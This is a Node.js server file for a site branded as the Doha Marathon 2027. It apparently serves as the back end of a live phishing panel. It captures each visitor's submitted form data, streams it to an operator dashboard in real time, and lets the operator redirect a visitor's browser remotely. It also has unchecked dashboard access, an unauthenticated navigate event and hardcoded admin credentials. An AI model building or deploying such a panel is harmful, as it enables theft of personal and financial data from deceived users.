const express = require("express");
const http = require("http");
const path = require("path");
const crypto = require("crypto");
const { Server } = require("socket.io");
const cors = require("cors");

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || "Hadmin";
const ADMIN_PASS = process.env.ADMIN_PASS || "Hadmin12345@@";
const PROJECT_NAME = process.env.PROJECT_NAME || "ماراثون الدوحة 2027";
const TOKEN_SECRET = process.env.TOKEN_SECRET || crypto.randomBytes(32).toString("hex");

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"], credentials: true }
});

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "10mb" }));

// --- In-memory data store ---
const sessions = new Map();
const authTokens = new Set();

function generateToken() {
  return crypto.randomBytes(48).toString("hex");
}

function authMiddleware(req, res, next) {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  if (!token || !authTokens.has(token)) {
    return res.status(401).json({ error: "غير مصرح" });
  }
  next();
}

// --- Auth endpoints ---
app.post("/dashboard/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = generateToken();
    authTokens.add(token);
    return res.json({ success: true, token });
  }
  res.status(401).json({ error: "اسم المستخدم أو كلمة المرور غير صحيحة" });
});

app.post("/dashboard/logout", (req, res) => {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  authTokens.delete(token);
  res.json({ success: true });
});

// --- API endpoints ---
app.get("/api/config", (req, res) => {
  res.json({ projectName: PROJECT_NAME });
});

app.get("/api/stats", authMiddleware, (req, res) => {
  let connectedUsers = 0;
  sessions.forEach(s => { if (s.isConnected) connectedUsers++; });
  res.json({ connectedUsers, totalRegistrations: sessions.size, activeUsers: connectedUsers });
});

app.get("/api/users", authMiddleware, (req, res) => {
  const list = [];
  sessions.forEach((data, sessionId) => {
    list.push({ sessionId, ...data });
  });
  list.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
  res.json(list);
});

app.get("/api/user/:sessionId", authMiddleware, (req, res) => {
  const data = sessions.get(req.params.sessionId);
  if (!data) return res.status(404).json({ error: "مستخدم غير موجود" });
  res.json({ sessionId: req.params.sessionId, ...data });
});

app.post("/api/track", (req, res) => {
  const { sessionId, type, page, data } = req.body || {};
  if (!sessionId) return res.status(400).json({ error: "missing sessionId" });

  let session = sessions.get(sessionId);
  if (!session) {
    session = { isConnected: false, currentPage: "index", formData: {}, lastSeen: Date.now() };
    sessions.set(sessionId, session);
  }

  if (type === "form-submit" && data) {
    if (!session.formData) session.formData = {};
    session.formData[page || "unknown"] = data;

    if (data.firstName) session.name = [data.firstName, data.lastName].filter(Boolean).join(" ");
    if (data.email) session.email = data.email;
    if (data.phone) session.phone = data.phone;
  }

  session.lastSeen = Date.now();
  if (page) session.currentPage = page;

  io.emit("user:update", { sessionId, ...session });
  res.json({ ok: true });
});

// --- Socket.io ---
io.on("connection", (socket) => {
  const { sessionId, instanceKey, token } = socket.handshake.query || {};

  if (token || instanceKey) {
    socket.join("dashboard");
  }

  if (sessionId) {
    let session = sessions.get(sessionId);
    if (!session) {
      session = { isConnected: true, currentPage: "index", formData: {}, lastSeen: Date.now() };
      sessions.set(sessionId, session);
    }
    session.isConnected = true;
    session.socketId = socket.id;
    session.lastSeen = Date.now();

    socket.on("user:join", ({ page }) => {
      session.currentPage = page || "index";
      session.lastSeen = Date.now();
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("user:form-submit", ({ page, formData }) => {
      if (!session.formData) session.formData = {};
      if (page && formData) {
        session.formData[page] = formData;
        if (formData.firstName) session.name = [formData.firstName, formData.lastName].filter(Boolean).join(" ");
        if (formData.email) session.email = formData.email;
        if (formData.phone) session.phone = formData.phone;
      }
      session.lastSeen = Date.now();
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("user:page-change", ({ page }) => {
      session.currentPage = page || session.currentPage;
      session.lastSeen = Date.now();
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("disconnect", () => {
      session.isConnected = false;
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });
  }

  socket.on("navigate", ({ sessionId: targetId, page }) => {
    const target = sessions.get(targetId);
    if (target && target.socketId) {
      io.to(target.socketId).emit("navigate", { page });
      target.currentPage = page;
      io.to("dashboard").emit("user:update", { sessionId: targetId, ...target });
    }
  });
});

// --- Broadcast live stats every 3 seconds ---
setInterval(() => {
  let connectedUsers = 0;
  sessions.forEach(s => { if (s.isConnected) connectedUsers++; });
  io.to("dashboard").emit("stats:live", {
    connectedUsers,
    totalRegistrations: sessions.size,
    activeUsers: connectedUsers
  });
}, 3000);

// --- Static files ---
app.use(express.static(path.join(__dirname), {
  extensions: ["html"],
  setHeaders: (res, filePath) => {
    if (filePath.endsWith(".html")) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
    }
  }
}));

app.get("*", (req, res) => {
  res.status(404).send("Not Found");
});

server.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
